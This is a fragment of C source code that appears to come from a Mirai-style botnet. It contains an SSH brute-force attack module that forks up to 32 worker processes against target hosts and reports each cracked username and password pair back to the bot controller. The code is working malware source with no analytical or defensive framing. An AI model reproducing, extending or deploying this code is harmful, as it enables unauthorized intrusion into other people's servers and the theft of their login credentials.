            int pos = 0;

            pos += util_strcpy(msg + pos, "SSH ");
            pos += util_strcpy(msg + pos, (char *)user);
            msg[pos++] = ':';
            util_strcpy(msg + pos, (char *)pass);
            send_response(MSG_RESP_TEXT, (uint8_t *)msg, util_strlen(msg));
        }

        close(fd);
        /* tiny sleep to avoid thundering-herd on same host */
        usleep(10000 + rand_next() % 90000);
    }
}

/* â”€â”€ Entry â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void attack_ssh(uint8_t targs_len, struct attack_target *targs,
                uint8_t opts_len, struct attack_option *opts)
{
    int workers = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 8);
    if (workers < 1)   workers = 1;
    if (workers > 32)  workers = 32;

#ifdef ANDROID
    ssh_worker(targs_len, targs, opts_len, opts, 0);
#else
    int i;
    for (i = 0; i < workers; i++) {
        pid_t pid = fork();
        if (pid < 0) continue;
        if (pid == 0) {
            ssh_worker(targs_len, targs, opts_len, opts, i);
            exit(0);
        }
    }
    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        sleep(1);
    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;
#endif
}
